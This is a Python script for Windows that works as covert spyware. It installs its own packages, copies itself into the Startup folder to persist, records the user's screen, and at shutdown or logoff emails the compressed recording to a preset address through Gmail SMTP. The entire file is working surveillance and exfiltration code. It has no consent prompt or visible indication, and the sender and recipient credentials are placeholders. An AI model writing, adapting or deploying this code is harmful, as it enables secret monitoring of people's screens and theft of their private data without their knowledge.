import os
import sys
import subprocess
import shutil
import cv2
import numpy as np
import mss
import time
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from email.mime.text import MIMEText
import subprocess as sp
import win32api
import win32con
import threading

# List of required libraries
required_libs = ['opencv-python', 'mss', 'numpy', 'pywin32', 'ffmpeg-python']

# Function to install the required libraries
def install_packages(packages):
    for package in packages:
        try:
            __import__(package.split('==')[0])  # Try to import the package
        except ImportError:
            # If the package is not installed, install it
            subprocess.check_call([sys.executable, "-m", "pip", "install", package])

# Install necessary packages
install_packages(required_libs)

# Screen recording parameters
filename = "screen_recording.mp4"  # Original video file
compressed_filename = "screen_recording_compressed.mp4"  # Compressed video file name
fps = 60.0  # Frames per second
capture_duration = 10  # Duration of the recording in seconds
screen_width = 1920  # Screen width
screen_height = 1080  # Screen height

# Email sending parameters
sender_email = "your_email@gmail.com"  # Replace with your Gmail address
sender_password = "your_app_password"  # Replace with your Gmail app password
recipient_email = "recipient_email@gmail.com"  # Replace with the recipient's email address
subject = "Screen Recording"
body = "Please find the attached screen recording."

# Path to the startup folder
startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
script_path = os.path.abspath(__file__)  # Full path of the current script
script_name = os.path.basename(script_path)  # Script name
startup_script_path = os.path.join(startup_folder, script_name)

shutdown_initiated = False  # Flag to check shutdown

# Function to check if the script is already in startup
def check_and_copy_to_startup():
    if not os.path.exists(startup_script_path):
        shutil.copy2(script_path, startup_folder)

# Function to record screen
def record_screen(filename, duration, fps, screen_width, screen_height):
    fourcc = cv2.VideoWriter_fourcc(*"mp4v")
    out = cv2.VideoWriter(filename, fourcc, fps, (screen_width, screen_height))

    with mss.mss() as sct:
        monitor = {"top": 0, "left": 0, "width": screen_width, "height": screen_height}
        start_time = time.time()

        while True:
            img = np.array(sct.grab(monitor))
            frame = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)
            out.write(frame)

            if time.time() - start_time > duration:
                break

    out.release()
    cv2.destroyAllWindows()

# Function to compress video using ffmpeg
def compress_video(input_file, output_file):
    ffmpeg_command = [
        'ffmpeg', '-i', input_file, '-vcodec', 'libx264', '-crf', '28', output_file
    ]
    sp.run(ffmpeg_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

# Function to send email with attachment
def send_email_with_attachment(sender_email, sender_password, recipient_email, subject, body, filename):
    msg = MIMEMultipart()
    msg["From"] = sender_email
    msg["To"] = recipient_email
    msg["Subject"] = subject

    msg.attach(MIMEText(body, "plain"))

    with open(filename, "rb") as attachment:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())
    
    encoders.encode_base64(part)
    part.add_header("Content-Disposition", f"attachment; filename= {os.path.basename(filename)}")

    msg.attach(part)

    with smtplib.SMTP("smtp.gmail.com", 587) as server:
        server.starttls()
        server.login(sender_email, sender_password)
        server.sendmail(sender_email, recipient_email, msg.as_string())

# Function to handle shutdown/restart event
def shutdown_handler(ctrl_type):
    global shutdown_initiated
    if ctrl_type == win32con.CTRL_SHUTDOWN_EVENT or ctrl_type == win32con.CTRL_LOGOFF_EVENT:
        shutdown_initiated = True
        compress_video(filename, compressed_filename)
        send_email_with_attachment(sender_email, sender_password, recipient_email, subject, body, compressed_filename)
        return True
    return False

# Function to monitor for shutdown/restart
def monitor_shutdown():
    win32api.SetConsoleCtrlHandler(shutdown_handler, True)

# Main program
if __name__ == "__main__":
    shutdown_thread = threading.Thread(target=monitor_shutdown)
    shutdown_thread.daemon = True
    shutdown_thread.start()

    check_and_copy_to_startup()

    record_screen(filename, capture_duration, fps, screen_width, screen_height)

    while True:
        time.sleep(1)
